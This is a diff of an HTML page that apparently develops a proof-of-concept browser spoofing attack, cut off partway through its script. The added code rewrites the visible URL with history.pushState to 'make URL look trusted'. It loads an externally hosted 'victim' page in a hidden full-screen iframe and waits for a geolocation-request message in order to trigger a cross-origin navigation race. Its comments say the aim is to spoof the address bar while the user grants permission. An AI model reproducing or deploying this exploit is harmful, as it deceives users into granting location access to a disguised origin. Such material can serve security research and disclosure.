@@ -20,30 +20,41 @@ button {
   background: #007aff;
   color: #fff;
 }
+
+iframe {
+  width: 100%;
+  height: 100vh;
+  border: none;
+  display: none;
+}
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
+<div id="ui" style="text-align:center; margin-top:60px;">
   <button id="start">Open Maps</button>
 </div>
 
+<iframe id="victimFrame"></iframe>
+
 <script>
 const start = document.getElementById('start');
+const frame = document.getElementById('victimFrame');
 
 start.onclick = () => {
   // Step 1: Make URL look trusted
   history.pushState({}, '', '/maps');
 
-  // Step 2: Load victim UI
-  location.href = 'https://ecdnts-del.github.io/spoof/victim.html';
+  // Step 2: Load victim inside iframe (attacker stays alive)
+  frame.src = 'https://ecdnts-del.github.io/spoof/barspoof.html';
+  frame.style.display = 'block';
+  document.getElementById('ui').style.display = 'none';
 };
 
 /*
  * Step 3:
- * Wait for victim.html to start permission flow,
- * then trigger cross-origin navigation race
+ * Victim signals geolocation start → attacker triggers race
  */
 window.addEventListener('message', (e) => {
   if (e.data !== 'geo-request-started') return;
